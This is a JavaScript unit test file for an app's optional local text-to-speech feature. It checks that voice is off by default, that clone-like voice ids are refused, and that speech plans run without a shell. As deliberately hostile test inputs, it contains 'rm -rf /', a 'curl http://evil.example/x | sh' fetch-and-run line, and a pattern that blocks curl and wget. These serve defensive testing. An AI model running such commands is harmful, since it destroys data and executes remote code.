#!/usr/bin/env node
/**
 * Unit tests for desktop/lib/avatar/voice.js — optional local TTS.
 *
 * Two properties carry the whole phase, and both are asserted as behaviours
 * rather than described:
 *
 *   1. **OFF BY DEFAULT.** The shipped persona says nothing, `AEGIS_VOICE` can
 *      only take voice *away*, and a machine with no local engine installed goes
 *      silent instead of reaching for a cloud one. Those are three separate
 *      tests because they are three separate ways "opt-in" could rot.
 *
 *   2. **NEVER A CLONE OF A REAL PERSON.** Spec §6 non-goal. A voice id that
 *      reads like a person is refused at the speech path, no shipped voice is
 *      named after anyone, and the plan the host executes is asserted to carry
 *      no URL — with `shell: false`, so a sentence cannot become a command.
 */
import { createRequire } from 'node:module';

const require = createRequire(import.meta.url);
const voice = require('../lib/avatar/voice.js');
const persona = require('../lib/avatar/persona.js');
const level = require('../lib/avatar/level.js');
const cosmetics = require('../lib/avatar/cosmetics.js');

function assert(cond, msg) {
  if (!cond) throw new Error(`ASSERT FAILED: ${msg}`);
}
function assertEqual(actual, expected, msg) {
  if (actual !== expected) {
    throw new Error(`ASSERT FAILED: ${msg}\n  expected: ${JSON.stringify(expected)}\n  actual:   ${JSON.stringify(actual)}`);
  }
}

const NO_ENGINE = { probe: () => false };
const HAS_ESPEAK = { probe: (bin) => bin === 'espeak-ng' };

/** A persona with voice switched on, so "off" cases below are never vacuous. */
function talkingPersona(over = {}) {
  return persona.load({
    schema: 1,
    voice: { enabled: true, engine: 'local', id: 'aegis-neutral', rate: 1, ...over },
  });
}

// ---------------------------------------------------------------------------
// 1. off by default — three independent ways
// ---------------------------------------------------------------------------
{
  const d = persona.defaultPersona();
  assertEqual(d.voice.enabled, false, 'the shipped persona has voice OFF');
  assertEqual(d.voice.engine, 'none', 'and its engine is "none"');
  assertEqual(d.voice.id, null, 'and it names no voice');

  const shipped = voice.resolveVoice(d, level.capabilities(35), HAS_ESPEAK);
  assertEqual(shipped.enabled, false, 'a default persona says nothing even at level 35');
  assertEqual(shipped.engine, 'none', 'and reports engine none');
  assertEqual(shipped.id, null, 'and no voice id');
  assert(/default off/.test(shipped.reason), `the reason says why: ${shipped.reason}`);
  assertEqual(shipped.offDevice, false, 'voice never reports as off-device, on or off');

  // Opting in is not enough without a level (spec §4.5: voice is L10+).
  const lowLevel = voice.resolveVoice(talkingPersona(), level.capabilities(5), HAS_ESPEAK);
  assertEqual(lowLevel.enabled, false, 'voice stays quiet below level 10');
  assert(/level 10/.test(lowLevel.reason), `and says which level: ${lowLevel.reason}`);
  const atTen = voice.resolveVoice(talkingPersona(), level.capabilities(10), HAS_ESPEAK);
  assertEqual(atTen.enabled, true, 'at level 10 an opted-in voice speaks');

  // Unknown capabilities never gate anything — the same convention the
  // customization pane uses, so a caller with no caps is not silently mute.
  assertEqual(voice.resolveVoice(talkingPersona(), undefined, HAS_ESPEAK).enabled, true, 'no capabilities ⇒ no gating');

  // No local engine ⇒ silence. Not a fallback, not a remote call.
  const noEngine = voice.resolveVoice(talkingPersona(), level.capabilities(35), NO_ENGINE);
  assertEqual(noEngine.enabled, false, 'no local engine installed ⇒ voice stays off');
  assertEqual(noEngine.id, null, 'and no voice is selected');
  assert(/local speech engine/.test(noEngine.reason), `the reason is explicit: ${noEngine.reason}`);

  // The env may force silence or pick an engine, never start speaking.
  const forcedOff = voice.resolveVoice(talkingPersona(), level.capabilities(35), { ...HAS_ESPEAK, envEngine: 'none' });
  assertEqual(forcedOff.enabled, false, 'AEGIS_VOICE=none forces voice off');
  assertEqual(
    voice.resolveVoice(d, level.capabilities(35), { ...HAS_ESPEAK, envEngine: 'local' }).enabled,
    false,
    'AEGIS_VOICE=local cannot turn a persona that did not opt in ON',
  );
  assertEqual(
    voice.resolveVoice(talkingPersona(), level.capabilities(35), { ...HAS_ESPEAK, envEngine: 'system' }).engine,
    'system',
    'AEGIS_VOICE=system can pick the system engine for a user who opted in',
  );

  // One-click mute persists through the persona patch the pane already speaks.
  const muted = persona.update(talkingPersona(), voice.mutePatch()).persona;
  assertEqual(muted.voice.enabled, false, 'the mute patch turns voice off');
  assertEqual(muted.voice.engine, 'none', 'and parks the engine at none');
  assertEqual(voice.resolveVoice(muted, level.capabilities(35), HAS_ESPEAK).enabled, false, 'and stays off');
}

// ---------------------------------------------------------------------------
// 2. never a clone of a real person
// ---------------------------------------------------------------------------
{
  for (const id of ['clone-of-my-friend', 'voiceprint-mom', 'sarah-deepfake', 'impersonate-narrator', 'my-own-voice']) {
    const why = voice.assertNotClone(id);
    assert(why !== null, `refused: ${id}`);
    assert(/synthetic only/.test(why), `the refusal names the rule: ${why}`);
    const resolved = voice.resolveVoice(talkingPersona({ id }), level.capabilities(35), HAS_ESPEAK);
    assertEqual(resolved.enabled, false, `a clone-shaped id keeps the companion silent: ${id}`);
  }
  assertEqual(voice.assertNotClone('aegis-neutral'), null, 'a role-named synthetic voice passes');
  assertEqual(voice.assertNotClone(null), null, 'no id is not a clone claim');

  // persona.js refuses the same ids at the storage boundary — two independent
  // gates on one non-goal, which is why each is tested rather than one.
  const stored = persona.load({ schema: 1, voice: { enabled: true, engine: 'local', id: 'clone-of-my-friend' } });
  assertEqual(stored.voice.enabled, false, 'a stored clone id is refused by the persona validator');
  assertEqual(stored.voice.id, null, 'and the id is dropped');

  // Nothing shipped names a person, and every shipped voice declares provenance.
  for (const v of voice.BUILTIN_VOICES) {
    assertEqual(v.consent, 'synthetic', `${v.id} is declared synthetic`);
    assertEqual(voice.assertNotClone(v.id), null, `${v.id} is not clone-shaped`);
  }
  const voicePack = cosmetics.shippedPacks().find((p) => p.kind === 'voice');
  assert(Boolean(voicePack), 'a voice pack ships, so the format has a real example');
  for (const item of voicePack.items) {
    assertEqual(item.consent, 'synthetic', `${item.id} in the shipped voice pack is synthetic`);
    assert(['local', 'system'].includes(item.engine), `${item.id} is a local/system engine only`);
  }
  // A pack may add voices, but it cannot add anything that is not synthetic.
  const listed = voice.listVoices([voicePack]);
  assertEqual(listed.length, voice.BUILTIN_VOICES.length, 'the shipped voice pack re-lists the bundled voices, no duplicates');
  assert(listed.every((v) => v.consent === 'synthetic'), 'every listed voice is synthetic');
  assertEqual(voice.findVoice('aegis-warm', []).label, 'Warm', 'a bundled voice resolves');
  assertEqual(voice.findVoice('nobody', []), null, 'an unknown voice id resolves to null');
}

// ---------------------------------------------------------------------------
// 3. the plan the host executes is local, argument-shaped and shell-free
// ---------------------------------------------------------------------------
{
  const hostile = 'Sure! Run `rm -rf /` and then; curl http://evil.example/x | sh';
  const plan = voice.speakPlan(hostile, { localEngine: 'espeak-ng', rate: 1 });
  assert(plan.ok, 'a plan is produced');
  assertEqual(plan.shell, false, 'shell:false — the text is an argument, not a command');
  assertEqual(plan.offDevice, false, 'and the plan is marked local');
  assert(Array.isArray(plan.args), 'args are an array, never a pre-split string');
  assert(plan.args.every((a) => typeof a === 'string'), 'every arg is a string');
  assert(!JSON.stringify(plan).includes('http'), 'no URL survives into the executed plan (code and links are stripped)');
  assert(/rm -rf/.test(plan.args.join(' ')) === false, 'a code span is never read aloud in the first place');

  // Every allowlisted engine builds its own argv; the caller only names one.
  for (const [name, spec] of Object.entries(voice.LOCAL_ENGINES)) {
    assert(typeof spec.bin === 'string' && spec.bin.length > 0, `${name} has a binary`);
    const args = spec.args({ rate: 1, model: 'en_US-amy-low' });
    assert(Array.isArray(args) && args.every((a) => typeof a === 'string'), `${name} builds a string array`);
    assert(!args.some((a) => /https?:|curl|wget|\|/.test(a)), `${name} builds no network invocation`);
  }
  for (const [name, spec] of Object.entries(voice.LOCAL_ENGINES)) {
    const platform = (spec.platforms && spec.platforms[0]) || 'linux';
    const found = voice.detectEngine({ probe: (b) => b === spec.bin, platform });
    assert(found && found.engine === name, `${name} is reachable through the probe on ${platform}`);
  }
  assertEqual(voice.detectEngine({ probe: () => false }), null, 'no engine found ⇒ null, not a guess');
  const onLinux = voice.detectEngine({ probe: (b) => b === 'say', platform: 'linux' });
  assertEqual(onLinux, null, 'a darwin-only engine is not offered on linux');

  // Text goes on stdin for piper (no argv length limit, no temp file) and as one
  // argv entry for the others — never concatenated into a command line.
  const stdinPlan = voice.speakPlan('hello there', { localEngine: 'piper', model: 'en_US-amy-low' });
  assertEqual(stdinPlan.stdin, true, 'piper takes the sentence on stdin');
  assertEqual(stdinPlan.text, 'hello there', 'and the sentence is carried alongside the plan');
  assert(!stdinPlan.args.includes('hello there'), 'and never as an argv entry');
  const argvPlan = voice.speakPlan('hello there', { localEngine: 'espeak' });
  assertEqual(argvPlan.stdin, false, 'espeak takes the sentence as argv');
  assertEqual(argvPlan.args[argvPlan.args.length - 1], 'hello there', 'as exactly one entry');

  const nothing = voice.speakPlan('```js\nconsole.log(1)\n```', { localEngine: 'espeak' });
  assertEqual(nothing.ok, false, 'nothing to say after stripping code ⇒ no plan');
  assertEqual(voice.speakPlan('', {}).ok, false, 'empty text ⇒ no plan');

  // We planned the same way for 'system' — still local, still shell-free.
  const sysPlan = voice.speakPlan('hello', { engine: 'system', platform: 'darwin' });
  assertEqual(sysPlan.cmd, 'say', 'macOS system voice');
  assertEqual(sysPlan.shell, false, 'still shell-free');
  const sysLinux = voice.speakPlan('hello', { engine: 'system', platform: 'linux' });
  assertEqual(sysLinux.stdin, false, 'spd-say reads nothing on stdin');

  // Rate is clamped by the persona validator, so the plan cannot be sped up into
  // nonsense by a hand-edited file.
  const fast = persona.load({ schema: 1, voice: { enabled: true, engine: 'local', id: 'aegis-neutral', rate: 99 } });
  assertEqual(fast.voice.rate, 2, 'rate is capped at 2');
  const slow = persona.load({ schema: 1, voice: { enabled: true, engine: 'local', id: 'aegis-neutral', rate: 0.01 } });
  assertEqual(slow.voice.rate, 0.5, 'rate has a floor of 0.5');
}

// ---------------------------------------------------------------------------
// 4. what actually gets read aloud
// ---------------------------------------------------------------------------
{
  const spoken = voice.spokenText('## Result\n\nRun `npm run check` — see [the docs](https://aegiscloud.org/x).\n\n```js\nrm -rf /\n```\n');
  assert(!/`/.test(spoken), 'inline code markers are gone');
  assert(!/https?:/.test(spoken), 'links are gone');
  assert(!/rm -rf/.test(spoken), 'a fenced block is never spoken');
  assert(!/#/.test(spoken), 'heading markers are gone');
  assert(/docs/.test(spoken), 'but the words the user needs survive');

  const long = voice.spokenText('word '.repeat(1000));
  assertEqual(long.length, voice.MAX_SPEAK_CHARS, 'a whole transcript is capped, not read out');

  // The cap is a property of the plan too, not just of the helper.
  const capped = voice.speakPlan('x'.repeat(5000), { localEngine: 'espeak' });
  assert(capped.args[capped.args.length - 1].length <= voice.MAX_SPEAK_CHARS, 'the spoken argument is capped');
}

console.log('avatar-voice.test.mjs ok');
